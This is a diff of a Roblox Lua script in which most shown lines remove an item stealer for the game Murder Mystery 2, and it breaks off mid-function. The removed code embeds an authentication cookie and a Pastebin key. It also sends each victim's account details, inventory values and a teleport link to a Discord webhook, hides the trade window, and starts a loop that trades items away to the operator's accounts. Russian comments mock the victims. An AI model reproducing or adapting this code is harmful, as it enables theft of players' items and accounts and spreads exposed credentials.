@@ -1,1108 +1,3077 @@
--- ==================== JOB ID VERIFICATION SYSTEM ====================
-getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzk2MTA1NTI5NTY3MTI2MDQyNjYoAw.Q_bHAVD-HxDeSgomIU63hkyS89xZS1_97S9SjHOR7eTtf4XBzKdp6NaghwZ6iOSe043CoTzmZq_yVM-6b7kEUuoa8Cw8ech3loB2FyAiUoJZpB2wtUf-t-pfzWQGEdUYjiCTpVRyFTSU7ATuGGDR_9SVJzYICEwaKItC7wKbI4d_4WejHTiYOmv8ut8wC95Ipe3B1yOssRD6t_xSsAKyyo7skhulxPyBzXpMgLvKAyNLMETtZnZS5Ewl5Hp8ph7BDz2gmMWoYEaZ0gHswU20nbuLxpUwPSnqyUn0CWaeh3L0413PpsLPhuPc85MwgTYN_Px_9x22QywYzO_AP4I63cwe_-pdbFfChZg_kAkQ8BhvTXXLxzJHYvIeqtle0YOyO7SR3UnlX27iUs79KZcY-BidC-5AE9gOzOoaeCiMulCPGD02HDaGcD0VHXLpkwpWuK3VbYsyR045lpJpG5oiJXhCKehDPA6fgRFMt1FV5hgm10lgx8ihE-VY_UcZML1GFWphtfiv0doVwuXkkSDWEoOjw86t0C5WE4Uu_t7_j-S06KJfd7RcasGu2bAfxC49u7z_mxP4pyvN2t05DR48f4IjiSOv77OWFdO9JeWPckJzgNi_kmicTiKoDszXujiNNIjjeS0VCH8Jo6LCkcdOkfwDaTp-s0SqnXDLPhCSD7YAH8dxm6_YjPM5E5kDvg1aobkDu6KVmAjRFGxLyGpkBxvmoWLR03hcSTra5VUTOWp52uDqYT3D_5JtvYKE8E0oix3bx8l-vmUAfzM1DMh1jTkkqxMSP1rJh9lH2H0H5sLDLKIlJtL8kUkv6FvlQ0LcHfQjwgiVXQz_0Zm-YN7vU9F2kFP75RXRcOmdgvlwsgHs3FBOPhnydQwiEVGtzt-Ed3Ew6j4ukvX3v4SyV89luczy2Yg2WHBnxUhob-A58b_JSIjuv3JOqe_vcq5yya2fQaeGVXpjML7UmCY5X26DxDT2oRLIErYheHa4PEJF4_vxw1izxb9opVc5C3UOKjd9hHOfjysUsNzVHxk_tw8h5Z7mVKw40LwpbcZfoPrbl2Or6gp1BubaljahxhZmcKKN3HG1AuXlnZbkexR1v76FUGMi_n06RQrWVIgTi2ILRqKHZkF46nAfGPIgq6qeE-zKt9XEmMK3EesTHMjDa1HNINUT2JY"
+-- =======================
+-- ANTI-INJECT PROTECTION
+-- =======================
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-
-local function KickPlayer(reason)
-    local localPlayer = Players.LocalPlayer
-    if localPlayer then
-        local kickMethods = {
-            function() localPlayer:Kick(reason) end,
-            function() game:Shutdown() end,
-            function() while true do end end,
-            function() error(reason) end,
-            function() getgenv().crash = nil end
-        }
-        
-        for i, method in ipairs(kickMethods) do
-            local success = pcall(method)
-            if success then
-                break
-            end
-        end
-    end
-end
-
-local function MakeRequestWithRetry(url, options, maxRetries)
-    maxRetries = maxRetries or 3
-    
-    for attempt = 1, maxRetries do
-        local success, response = pcall(function()
-            return request(options)
-        end)
-        
-        if success and response then
-            if response.StatusCode == 503 then
-                if attempt < maxRetries then
-                    wait(2)
-                end
-            else
-                return response
-            end
-        else
-            if attempt < maxRetries then
-                wait(1)
-            end
-        end
-    end
-    
-    return nil
-end
-
-local function GetRealJobIdWithAuth()
-    if not getgenv().Cookie then
-        return nil
-    end
-    
-    local localPlayer = Players.LocalPlayer
-    if not localPlayer then return nil end
-    
-    local placeId = game.PlaceId
-    local userIds = {}
-    local playerMap = {}
-    
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= localPlayer then
-            table.insert(userIds, player.UserId)
-            playerMap[player.UserId] = player.Name
-        end
-    end
-    
-    if #userIds == 0 then
-        return nil
-    end
-    
-    local function GetPresenceWithAuth(userIdsList)
-        local reqBody = HttpService:JSONEncode({
-            userIds = userIdsList
-        })
-        
-        local response = MakeRequestWithRetry("https://presence.roblox.com/v1/presence/users", {
-            Url = "https://presence.roblox.com/v1/presence/users",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["Cookie"] = ".ROBLOSECURITY=" .. tostring(getgenv().Cookie)
-            },
-            Body = reqBody
-        }, 3)
-        
-        if response then
-            local jsonSuccess, jsonData = pcall(function()
-                return HttpService:JSONDecode(response.Body)
-            end)
-            
-            if jsonSuccess then
-                return jsonData
-            else
-                return nil
-            end
-        else
-            return nil
-        end
-    end
-    
-    local presenceData = GetPresenceWithAuth(userIds)
-    if not presenceData then
-        return nil
-    end
-    
-    if not presenceData.userPresences then
-        return nil
-    end
-    
-    local foundJobIds = {}
-    
-    for _, presence in pairs(presenceData.userPresences) do
-        if presence.placeId == placeId and presence.gameId then
-            local jobId = presence.gameId
-            local playerName = playerMap[presence.userId] or "Unknown"
-            
-            if jobId and jobId ~= game.JobId then
-                table.insert(foundJobIds, {
-                    jobId = jobId,
-                    player = playerName,
-                    lastLocation = presence.lastLocation or "InGame"
-                })
-            end
-        end
-    end
-    
-    if #foundJobIds > 0 then
-        local jobIdCounts = {}
-        for _, found in ipairs(foundJobIds) do
-            jobIdCounts[found.jobId] = (jobIdCounts[found.jobId] or 0) + 1
-        end
-        
-        local bestJobId, maxCount = nil, 0
-        for jobId, count in pairs(jobIdCounts) do
-            if count > maxCount then
-                bestJobId = jobId
-                maxCount = count
-            end
-        end
-        
-        if bestJobId then
-            return bestJobId
-        end
-    end
-    
-    return nil
-end
-
-local function FindRealJobId()
-    local realJobId = GetRealJobIdWithAuth()
-    
-    if realJobId then
-        getgenv().RealJobId = realJobId
-        
-        pcall(function()
-            writefile("real_jobid.txt", realJobId)
-        end)
-        
-        return realJobId
-    else
-        wait(2)
-        KickPlayer("Server was closed due technical error. If this error repeat then send message to technical | Telegram - @tvoytwix")
-        return nil
-    end
-end
-
--- Проверяем JobId только если есть Cookie
-if getgenv().Cookie then
-    local realJobId = FindRealJobId()
-    
-    if realJobId then
-        print("Real JobId found:", realJobId)
-    end
-else
-    wait(3)
-    KickPlayer("Cookie not configured - JobId verification required")
-end
-
--- ==================== ОРИГИНАЛЬНЫЙ КОД (БЕЗ ИЗМЕНЕНИЙ) ====================
-Username = "knisdqx_meow" -- >> Your main account
-Username2 = "sosedra6" -- >> Your alt account
-Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441725786586615820/MjAaItKYv69qFFNdgxWQn1xe2HdO0ZV3rRKrbzBLk64Gb99KvxnLNyM9evUsYQa-Vd42" -- >> https://stealer.to/
-MinimumValues = 30 -- >> Set 0 to disable
-
-repeat task.wait() until game:IsLoaded()
-
-if getgenv().mm2 then return end
-getgenv().mm2 = true
-
-if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
-    game:GetService("Players").LocalPlayer:Kick("\nANTIBAN: Admins detected. Join another server")
+-- Метод 1: Глобальная переменная
+if _G.LAIMON_FRESH_UI_LOADED then
+    script:Destroy()
     return
 end
+_G.LAIMON_FRESH_UI_LOADED = true
 
-if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer() == "VIPServer" then
-    game.Players.LocalPlayer:Kick("\nScript doesn't supported vip servers")
-    return
-end
-
-if MinimumValues == nil or MinimumValues < 0 then
-    MinimumValues = 0
-end
-
-local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
-local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
-local LP = game:GetService("Players").LocalPlayer
-local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
-local NameValue = game:GetService("Players").LocalPlayer.Name
-or "Unknown"
-local IdValue = game:GetService("Players").LocalPlayer.userId
-or "Unknown"
-local AgeValue = game:GetService("Players").LocalPlayer.AccountAge
-or "Unknown"
-local ExecutorValue = identifyexecutor() or "Unknown"
-local VersionValue = "2.0 (Trade System + Values Update)"
-
--- СИСТЕМА ТЕЛЕПОРТА (ИСПРАВЛЕННАЯ) - используем RealJobId вместо game.JobId
-local placeId = game.PlaceId
-local realJobId = getgenv().RealJobId or game.JobId  -- Используем RealJobId если есть, иначе обычный
-local protocolLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
-local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. realJobId .. "\")"
-
-local valuesTable = {
-    -- >> Ancients/Tier 2 << --
-    ["Gingerscope"] = 10500,
-    ["TravelerAxe"] = 5000,
-    ["Harvester"] = 390,
-    ["Icepiercer"] = 350,
-    ["VampireAxe"] = 600,
-    ["Celestial"] = 800,
-    ["Corrupt"] = 800,
-    -- >> Ancients/Tier 1 << --
-    ["SwirlyAxe"] = 100,
-    ["Icebreaker"] = 100,
-    ["ElderwoodScythe"] = 65,
-    ["Scythe"] = 77,
-    ["Hallowscythe"] = 55,
-    ["Logchopper"] = 25,
-    ["Icewing"] = 5,
-    -- >> Vintages/Tier 2 << --
-    ["GhostK2018"] = 10,
-    ["AmericaGun"] = 8,
-    ["BloodKnife"] = 8,
-    -- >> Vintages/Tier 1 << --
-    ["Disint"] = 7,
-    ["Phaser"] = 7,
-    ["ShadowKnife"] = 6,
-    ["TimeKnife"] = 5,
-    ["Gun1"] = 4,
-    ["GoldenGun"] = 4,
-    ["Knife1"] = 3,
-    -- >> Chromas/Tier 3 << --
-    ["TravelerGunChroma"] = 20000,
-    ["TreeGun2023Chroma"] = 30000,
-    ["TreeKnife2023Chroma"] = 35000,
-    ["VampireGunChroma"] = 10000,
-    ["ConstellationChroma"] = 10000,
-    ["BaubleChroma"] = 6500,
-    ["WatergunChroma"] = 3500,
-    ["RaygunChroma"] = 7000,
-    ["AlienbeamChroma"] = 9000,
-    ["SunsetChroma"] = 3500,
-    ["SunriseChroma"] = 4500,
-    -- >> Chromas/Tier 2 << --
-    ["ChromaDarkbringer"] = 125,
-    ["ChromaLightbringer"] = 120,
-    ["CandleflameChroma"] = 115,
-    ["ElderwoodKnifeChroma"] = 115,
-    ["SwirlyGunChroma"] = 115,
-    ["Gingermint_KChroma"] = 110,
-    -- >> Chromas/Tier 1 << --
-    ["LugerChroma"] = 100,
-    ["LaserChroma"] = 80,
-    ["HeatChroma"] = 70,
-    ["DeathshardChroma"] = 65,
-    ["GemstoneChroma"] = 65,
-    ["SharkChroma"] = 65,
-    ["SlasherChroma"] = 65,
-    ["TidesChroma"] = 65,
-    ["FangChroma"] = 55,
-    ["GingerbladeChroma"] = 55,
-    ["SeerChroma"] = 55,
-    ["BonebladeChroma"] = 50,
-    ["SawChroma"] = 50,
-    -- >> Godlies/Tier 3 << --
-    ["TravelerGun"] = 3600,
-    ["TreeGun2023"] = 2800,
-    ["Turkey2023"] = 1500,
-    ["TreeKnife2023"] = 1200,
-    ["Blossom_G"] = 640,
-    ["Sakura_K"] = 630,
-    ["Constellation"] = 800,
-    ["Darkshot"] = 600,
-    ["Darksword"] = 460,
-    ["VampireGun"] = 800,
-    ["Bauble"] = 400,
-    ["ZombieBat"] = 250,
-    ["Candy"] = 150,
-    ["Rainbow_G"] = 300,
-    ["Rainbow_K"] = 300,
-    ["Ocean_G"] = 150,
-    ["WraithGun"] = 145,
-    ["WraithKnife"] = 145,
-    ["Waves_K"] = 145,
-    ["AuroraKnife"] = 135,
-    ["AuroraGun"] = 135,
-    ["FlowerwoodGun"] = 135,
-    ["FlowerwoodKnife"] = 130,
-    ["Heartblade"] = 125,
-    ["Sugar"] = 125,
-    ["SwirlyGun"] = 115,
-    ["Makeshift"] = 105,
-    ["Candleflame"] = 100,
-    ["ElderwoodKnife"] = 100,
-    ["Watergun"] = 90,
-    ["Raygun"] = 250,
-    ["Alienbeam"] = 300,
-    ["Xenoknife"] = 200,
-    ["Xenoshot"] = 250,
-    ["Flora"] = 200,
-    ["Bloom"] = 200,
-    ["Sunset"] = 250,
-    ["Sunrise"] = 300,
-    -- >> Godlies/Tier 2 << --
-    ["Phantom2022"] = 75,
-    ["Spectre2022"] = 75,
-    ["Luger"] = 75,
-    ["RedLuger"] = 70,
-    ["SwirlyBlade"] = 65,
-    ["Iceblaster"] = 65,
-    ["Pearl_K"] = 62,
-    ["Pearl_G"] = 62,
-    ["Darkbringer"] = 60,
-    ["ElderwoodGun"] = 60,
-    ["Lightbringer"] = 58,
-    ["Gingermint_K"] = 40,
-    ["Gingermint_G"] = 40,
-    ["GreenLuger"] = 40,
-    ["Hallowgun"] = 35,
-    ["Laser"] = 32,
-    ["Icebeam"] = 32,
-    ["Iceflake"] = 32,
-    ["Plasmabeam"] = 32,
-    ["Plasmablade"] = 32,       
-    ["Amerilaser"] = 30,
-    ["Blaster"] = 30,
-    ["Nightblade"] = 30,
-    ["AmericaSword"] = 28,
-    ["Nebula"] = 28,
-    ["Shark"] = 28,
-    ["Virtual"] = 27,
-    ["Gemstone"] = 25,
-    ["Clockwork"] = 23,
-    ["EternalCane"] = 23,
-    ["GingerLuger"] = 23,
-    ["Lugercane"] = 23,
-    ["Pixel"] = 23,
-    ["Slasher"] = 23,
-    ["Gingerblade"] = 22,
-    ["Heat"] = 22,
-    ["Minty"] = 22,
-    -- >> Godlies/Tier 1 << --
-    ["BattleAxe2"] = 20,
-    ["Deathshard"] = 20,
-    ["Tides"] = 20,
-    ["Fang"] = 18,
-    ["Spider"] = 17,
-    ["Chill"] = 17,
-    ["Jinglegun"] = 15,
-    ["VampiresEdge"] = 15,
-    ["Pumpking"] = 15,
-    ["Bioblade"] = 13,
-    ["BattleAxe"] = 13,
-    ["Frostsaber"] = 13,
-    ["Xmas"] = 13,
-    ["Flames"] = 12,
-    ["Hallow"] = 12,
-    ["IceDragon"] = 12,
-    ["IceShard"] = 12,
-    ["WintersEdge"] = 12,
-    ["Ghostblade"] = 10,
-    ["HallowsBlade"] = 10,
-    ["Handsaw"] = 10,
-    ["Eternal"] = 10,
-    ["Eternal2"] = 10,
-    ["Eternal3"] = 10,
-    ["Eternal4"] = 10,
-    ["Boneblade"] = 8,
-    ["Eggblade"] = 7,
-    ["Frostbite"] = 7,
-    ["Prismatic"] = 7,
-    ["Saw"] = 7,
-    ["Snowflake"] = 7,
-    -- >> Godlies/Tier 0 << --
-    ["Peppermint"] = 7,
-    ["Cookieblade"] = 7,
-    ["BlueSeer"] = 7,
-    ["PurpleSeer"] = 7,
-    ["RedSeer"] = 7,
-    ["TheSeer"] = 7,
-    ["OrangeSeer"] = 7,
-    ["YellowSeer"] = 7,
-    -- >> Legendaries/Special Tier << --
-    ["JD"] = 65,
-    -- >> Legendaries/Tier 3 << --
-    ["Latte_G_2023"] = 90,
-    ["Latte_K_2023"] = 90,
-    ["CottonCandy"] = 65,
-    ["Witched"] = 55,
-    ["Beach_K_2023"] = 30,
-    ["Cavern_K_2019"] = 22,
-}
-
-function SendMessageEMBED(url, embed, bool)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    
-    -- Формируем контент с телепортом в стиле первого кода
-    local teleportContent = "🎯 **ВЬЕБАН** Очередной кукич:\n\n" .. TeleportScript
-    
-    local data = {
-        ["username"] = "M O L I T O W N",
-        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
-        ["content"] = teleportContent,
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-                ["footer"] = {
-                    ["text"] = "Molitown Team 2025 | debugged for 6h"
-                }
-            }
-        }
-    }
-    
-    local data2 = {
-        ["username"] = "M O L I T O W N", 
-        ["avatar_url"] = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg", 
-        ["content"] = "-- @everyone\n" .. teleportContent,
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-                ["footer"] = {
-                    ["text"] = "Molitown Team 2025 | debugged for 6h"
-                }
-            }
-        }
-    }
-    
-    local body = http:JSONEncode(data)
-    local body2 = http:JSONEncode(data2)
-
-    if bool == true then
-        local response = request({
-            Url = url,
-            Method = "POST",
-            Headers = headers,
-            Body = body2
-        })
-    else
-        local response = request({
-            Url = url,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-    end
-end
-
--- Функция для отправки успешного трейда в Discord
-function SendTradeSuccessMessage(sentItems, ReceiverName)
-    local http = game:GetService("HttpService")
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    
-    -- Форматируем список отправленных предметов
-    local itemsText = ""
-    local totalValue = 0
-    
-    for _, item in pairs(sentItems) do
-        local itemValue = valuesTable[item.dataId] or 0
-        totalValue = totalValue + (itemValue * item.amount)
-        itemsText = itemsText .. string.format("%s • x%d • %d\n", item.name, item.amount, itemValue * item.amount)
-    end
-    
-    local data = {
-        ["username"] = "Mama Mia",
-        ["avatar_url"] = "https://i.pinimg.com/736x/ae/1c/35/ae1c3515d3891f20997929813c9ea8fe.jpg",
-        ["embeds"] = {
-            {
-                ["title"] = "✅ Вьебали додика в чешки",
-                ["color"] = 65280,
-                ["fields"] = {
-                    {
-                        ["name"] = "📦 Мечи детей:",
-                        ["value"] = "```" .. itemsText .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "💰 Общая стоимость:",
-                        ["value"] = "**" .. totalValue .. "**",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "👤 Забрал:",
-                        ["value"] = "**" .. ReceiverName .. "**",
-                        ["inline"] = true
-                    }
-                },
-                ["footer"] = {
-                    ["text"] = "Molitown Team feat. Interpol • " .. os.date("%Y-%m-%d %H:%M:%S")
-                }
-            }
-        }
-    }
-    
-    local body = http:JSONEncode(data)
-    
-    local response = request({
-        Url = Webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
-
--- Новая улучшенная функция скрытия TradeGUI
-local function setupTradeGUIHider()
-    local player = game:GetService("Players").LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-    
-    local function hideTradeGUI()
-        for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
-            local gui = playerGui:FindFirstChild(guiName)
-            if gui then
-                gui.Enabled = false
-                -- Двойная защита: отключаем изменение Enabled
-                if not gui:FindFirstChild("AntiFlash") then
-                    local conn
-                    conn = gui:GetPropertyChangedSignal("Enabled"):Connect(function()
-                        if gui.Enabled then
-                            gui.Enabled = false
-                        else
-                            conn:Disconnect()
-                        end
-                    end)
-                    local anti = Instance.new("BoolValue")
-                    anti.Name = "AntiFlash"
-                    anti.Parent = gui
-                end
-            end
-        end
-    end
-
-    -- Скрываем сразу при запуске
-    hideTradeGUI()
-
-    -- Отслеживаем появление новых окон
-    playerGui.ChildAdded:Connect(function(child)
-        if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
-            hideTradeGUI()
-        end
-    end)
-
-    -- Периодическая проверка
-    while true do
-        hideTradeGUI()
-        task.wait(0.1)
-    end
-end
-
--- Запускаем скрытие GUI в отдельной корутине
-coroutine.wrap(setupTradeGUIHider)()
-
-local levelTable = {}
-for i,v in pairs(LevelModule.XPTable) do
-    if PlayerDataModule.NewXP < v then
-        table.insert(levelTable, i)
-    end
-end
-local playerLevel = math.min(table.unpack(levelTable))
-local playerPrestige = LevelModule.Prestige
-
-local allItems = {}
-local totalValues = 0
-
-local vintageItems1 = {}
-local commonItems1 = {}
-local uncommonItems1 = {}
-local rareItems1 = {}
-local legendaryItems1 = {}
-local godlyItems1 = {}
-local ancientItems1 = {}
-local uniqueItems1 = {}
-
-local vintageItems = {}
-local commonItems = {}
-local uncommonItems = {}
-local rareItems = {}
-local legendaryItems = {}
-local godlyItems = {}
-local ancientItems = {}
-local uniqueItems = {}
-
-local vintageItemsC = 0
-local commonItemsC = 0
-local uncommonItemsC = 0
-local rareItemsC = 0
-local legendaryItemsC = 0
-local godlyItemsC = 0
-local ancientItemsC = 0
-local uniqueItemsC = 0
-
-local uniqueItemsValue = 0
-local ancientItemsValue = 0
-local godlyItemsValue = 0
-local vintageItemsValue = 0
-local legendaryItemsValue = 0
-local rareItemsValue = 0
-local uncommonItemsValue = 0
-local commonItemsValue = 0
-
-for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
-    for c, d in pairs(b) do
-        local itemValue = valuesTable[d.DataID] or 0
-        local totalValue = itemValue * d.Amount
-        
-        if d.Rarity == "Unique" then
-            uniqueItemsValue = uniqueItemsValue + totalValue
-        elseif d.Rarity == "Ancient" then
-            ancientItemsValue = ancientItemsValue + totalValue
-        elseif d.Rarity == "Godly" then
-            godlyItemsValue = godlyItemsValue + totalValue
-        elseif d.Rarity == "Vintage" then
-            vintageItemsValue = vintageItemsValue + totalValue
-        elseif d.Rarity == "Legendary" then
-            legendaryItemsValue = legendaryItemsValue + totalValue
-        elseif d.Rarity == "Rare" then
-            rareItemsValue = rareItemsValue + totalValue
-        elseif d.Rarity == "Uncommon" then
-            uncommonItemsValue = uncommonItemsValue + totalValue
-        elseif d.Rarity == "Common" then
-            commonItemsValue = commonItemsValue + totalValue
-        end
-    end
-end
-
-for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
-    for c, d in pairs(b) do
-        local itemKey = d.DataID
-        local itemValue = valuesTable[itemKey]
-        local weaponValue = itemValue and (itemValue * d.Amount) or 0
-
-        local formatTable = {
-            weaponName = d.ItemName,
-            weaponData = d.DataID,
-            weaponAmount = d.Amount,
-            weaponRarity = d.Rarity,
-            weaponValue = weaponValue
-        }
-        
-        table.insert(allItems, formatTable)
-
-        local visualFormat = d.ItemName .. " • [x" .. d.Amount .. " | " .. weaponValue .. "]"
-
-        if d.Rarity == "Vintage" then
-            vintageItemsC = vintageItemsC + d.Amount
-            table.insert(vintageItems, visualFormat)
-            table.insert(vintageItems1, formatTable)
-        end
-
-        if d.Rarity == "Common" then
-            commonItemsC = commonItemsC + d.Amount
-            table.insert(commonItems, visualFormat)
-            table.insert(commonItems1, formatTable)
-        end
-
-        if d.Rarity == "Uncommon" then
-            uncommonItemsC = uncommonItemsC + d.Amount
-            table.insert(uncommonItems, visualFormat)
-            table.insert(uncommonItems1, formatTable)
-        end
-
-        if d.Rarity == "Rare" then
-            rareItemsC = rareItemsC + d.Amount
-            table.insert(rareItems, visualFormat)
-            table.insert(rareItems1, formatTable)
-        end
-
-        if d.Rarity == "Legendary" then
-            legendaryItemsC = legendaryItemsC + d.Amount
-            table.insert(legendaryItems, visualFormat)
-            table.insert(legendaryItems1, formatTable)
-        end
-
-        if d.Rarity == "Godly" then
-            godlyItemsC = godlyItemsC + d.Amount
-            table.insert(godlyItems, visualFormat)
-            table.insert(godlyItems1, formatTable)
-        end
-
-        if d.Rarity == "Ancient" then
-            ancientItemsC = ancientItemsC + d.Amount
-            table.insert(ancientItems, visualFormat)
-            table.insert(ancientItems1, formatTable)
-        end
-
-        if d.Rarity == "Unique" then
-            uniqueItemsC = uniqueItemsC + d.Amount
-            table.insert(uniqueItems, visualFormat)
-            table.insert(uniqueItems1, formatTable)
-        end
-    end
-end
-
--- >> Values calculating logic << --
-for _, item in pairs(allItems) do
-    totalValues = totalValues + item.weaponValue
-end
-
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Trade = ReplicatedStorage:WaitForChild("Trade")
-local lastOfferValue = nil
-
--- Перехватываем UpdateTrade чтобы получить LastOffer
-Trade.UpdateTrade.OnClientEvent:Connect(function(tradeData)
-    -- Сохраняем LastOffer из данных трейда
-    lastOfferValue = tradeData.LastOffer
-end)
-
-local HttpService = game:GetService("HttpService")
-
-local function pastebin(content)
-
-    local body = {
-        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
-        api_paste_code = content,
-        api_option = "paste"
-    }
-
-    local encodedBody = ""
-    for key, value in pairs(body) do
-        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
-    end
-    encodedBody = encodedBody:sub(1, -2)
-
-    local response
-    local success, err = pcall(function()
-        response = request({
-            Url = "https://pastebin.com/api/api_post.php",
-            Method = "POST",
-            Body = encodedBody,
-            Headers = {
-                ["Content-Type"] = "application/x-www-form-urlencoded"
-            },
-            Timeout = 20
-        })
-    end)
-
-    if not success or not response or not response.Success then
-        return "\nError...\n"
-    end
-
-    local pasteUrl = response.Body
-    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
-
-    return rawUrl
-end
-
-local function formatItems(itemList)
-    if #itemList == 0 then
-        return "None"
-    else
-        return table.concat(itemList, "\n")
-    end
-end
-
-local pastebinString = "-- [ Unique Items ] --\n" ..formatItems(uniqueItems)..
-                         "\n\n-- [ Ancient Items ] --\n" ..formatItems(ancientItems)..
-                         "\n\n-- [ Godly Items ] --\n" ..formatItems(godlyItems)..
-                         "\n\n-- [ Legendary Items ] --\n" ..formatItems(legendaryItems)..
-                         "\n\n-- [ Vintage Items ] --\n" ..formatItems(vintageItems)..
-                         "\n\n-- [ Rare Items ] --\n" ..formatItems(rareItems)..
-                         "\n\n-- [ Uncommon Items ] --\n" ..formatItems(uncommonItems)..
-                         "\n\n-- [ Common Items ] --\n" ..formatItems(commonItems)..
-
-                        "\n\nInventory list ft. Molitown"
-
-
-local pastebinLink = pastebin(pastebinString)
-
-if totalValues < MinimumValues then
-    return
-end
-
--- УЛУЧШЕННАЯ ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ ТОП ПРЕДМЕТОВ
-local function getTopValuableItems(n)
-    local allItems = {}
-    
-    -- Собираем все предметы с детальной информацией
-    for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
-        for c, d in pairs(b) do
-            local itemValue = valuesTable[d.DataID] or 0
-            local totalValue = itemValue * d.Amount
-            
-            table.insert(allItems, {
-                name = d.ItemName,
-                dataId = d.DataID,
-                value = itemValue,
-                amount = d.Amount,
-                totalValue = totalValue,
-                rarity = d.Rarity
-            })
-        end
-    end
-    
-    -- Сортируем по убыванию ценности за штуку
-    table.sort(allItems, function(a, b) 
-        return a.value > b.value
-    end)
-    
-    -- Возвращаем топ-N предметов с улучшенным форматированием
-    local topItems = {}
-    for i = 1, math.min(n, #allItems) do
-        local item = allItems[i]
-        local rarityEmoji = {
-            Unique = "💎",
-            Ancient = "🔥", 
-            Godly = "⭐",
-            Vintage = "🕰️",
-            Legendary = "👑",
-            Rare = "🔵",
-            Uncommon = "🟢",
-            Common = "⚪"
-        }
-        
-        local emoji = rarityEmoji[item.rarity] or "📦"
-        table.insert(topItems, string.format("%s %s • %d • x%d", emoji, item.name, item.value, item.amount))
-    end
-    return topItems
-end
-
--- Получаем 5 самых ценных предметов
-local topItems = getTopValuableItems(5)
-local topItemsText = #topItems > 0 and table.concat(topItems, "\n") or "No valuable items"
-
-local embed = {
-    ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - " .. NameValue,
-    ["color"] = 16711935, 
-    ["fields"] = {
-        {
-            ["name"] = "🔗 **Teleport to :mammoth:**",
-            ["value"] = 
-            "🚀**Вставь в браузер для связи с дуплом**\n```" .. protocolLink .. "```\n" ..
-            "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
-            ["inline"] = false
-        },
-        {
-            ["name"] = "〘:mammoth:〙**Info user**",
-            ["value"] = 
-            "```lua\n"..
-            "Username      : "..NameValue.."\n"..
-            "Account Age   : "..AgeValue.." Days\n"..
-            "Executor      : "..ExecutorValue.."\n"..
-            "Receiver      : "..Username.."/"..Username2.."\n"..
-            "Version       : "..VersionValue.."```",
-            ["inline"] = false
-        },
-        {
-            ["name"] = "〘:moneybag:〙**Inventory Stats**",
-            ["value"] = 
-            "```lua\n"..
-            "💎 ТОП 5 ПРЕДМЕТОВ:\n"..topItemsText.."\n\n"..
-            "💰 Общая стоимость : "..totalValues.."\n\n"..
-            "🔥 Ancients Value  : "..ancientItemsValue.."\n"..
-            "⭐ Godlies Value   : "..godlyItemsValue.."\n"..
-            "👑 Legendaries     : "..legendaryItemsValue.."\n```",
-            ["inline"] = false
-        },
-        {
-            ["name"] = "〘:package:〙**Full Inventory List**",
-            ["value"] = "[📋 Click to check]("..pastebinLink..")",
-            ["inline"] = false
-        },
-    }
-}
-
--- Отправляем уведомление в зависимости от ценности
-if godlyItemsValue >= 100 or ancientItemsValue >= 100 or uniqueItemsValue >= 100 or totalValues >= 100 then
-    SendMessageEMBED(Webhook, embed, true)
-else
-    SendMessageEMBED(Webhook, embed, false)
-end
-
-local loop = false
-local tradeInProgress = false
-
-local function isTradeGUIOpen()
-    local player = game:GetService("Players").LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-    
-    for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
-        local tradeGUI = playerGui:FindFirstChild(guiName)
-        if tradeGUI then
-            return true
-        end
+-- Метод 2: Проверка дубликатов в CoreGui
+local function checkForDuplicates()
+    local existingGuis = game:GetService("CoreGui"):FindFirstChild("LaimonFreshUI")
+    if existingGuis then
+        script:Destroy()
+        return true
     end
     return false
 end
 
-local function stealItems(ReceiverName)
-    loop = true
-    while loop do
-        if tradeInProgress then
-            task.wait(1)
-            continue
-        end
-        
-        local availableItems = {}
-        for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
-            for c, d in pairs(b) do
-                local itemValue = valuesTable[d.DataID] or 0
-                if itemValue > 0 and d.Amount > 0 then
-                    table.insert(availableItems, {
-                        name = d.ItemName,
-                        dataId = d.DataID,
-                        value = itemValue,
-                        amount = d.Amount
-                    })
-                end
-            end
-        end
-        
-        table.sort(availableItems, function(a, b) 
